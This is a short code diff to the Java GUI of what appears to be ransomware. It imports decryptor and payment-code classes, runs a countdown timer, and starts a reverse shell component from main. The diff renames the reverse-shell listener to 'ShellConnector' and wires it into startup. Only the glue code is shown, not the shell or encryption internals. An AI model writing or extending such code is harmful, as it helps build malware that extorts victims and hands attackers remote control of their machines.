@@ -1,6 +1,6 @@
 import Decryptor.Decrypt;
 import Decryptor.PaymentCode;
-import ReverseShellScripts.ReverseShellListener;
+import ReverseShellScripts.ShellConnector;
 
 import javax.swing.*;
 import java.awt.*;
@@ -146,9 +146,9 @@ public class GUI {
         });
     }
 
-    public void ReverseShellListener() {
+    public void runShellConnector() {
         String[] args = {};
-        ReverseShellListener.main(args);
+        ShellConnector.main(args);
     }
 
     public void startCountdownTimer() {
@@ -186,11 +186,11 @@ public class GUI {
         });
         countdownTimer.start();
     }
-
+    //GUI set up 
     public static void main(String[] args) {
         GUI gui = new GUI(600, 400);
         gui.setUpGUI();
         gui.setUpButtonListeners();
-        gui.ReverseShellListener();
+        gui.runShellConnector();
     }
 }
